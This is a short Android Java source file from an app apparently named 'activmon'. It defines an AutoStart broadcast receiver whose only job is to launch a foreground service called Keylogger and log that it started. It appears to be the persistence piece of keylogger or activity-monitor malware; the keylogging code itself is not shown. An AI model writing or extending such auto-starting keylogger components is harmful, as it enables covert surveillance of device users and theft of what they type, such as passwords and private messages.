package com.example.activmon;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class AutoStart extends BroadcastReceiver {
    public void onReceive(Context context, Intent arg1) {
        Intent intent2 = new Intent(context, Keylogger.class);
        context.startForegroundService(intent2);
        Log.v("Service Autostart:", "started");
    }
}
